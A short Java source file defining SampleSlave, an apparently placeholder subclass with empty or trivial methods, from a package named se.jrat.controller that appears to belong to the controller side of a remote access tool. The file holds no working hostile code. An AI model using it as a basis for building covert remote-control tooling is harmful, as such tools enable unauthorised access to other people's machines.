package se.jrat.controller;

import java.io.File;

import com.redpois0n.oslib.AbstractOperatingSystem;

public class SampleSlave extends AbstractSlave {

	public SampleSlave(AbstractOperatingSystem os) {
		super(null, null);
		super.os = os;
	}

	@Override
	public void run() {
		
	}

	@Override
	public String getDisplayName() {
		return null;
	}

	@Override
	public void ping() throws Exception {
		
	}

	@Override
	public String getFileSeparator() {
		return File.separator;
	}

}
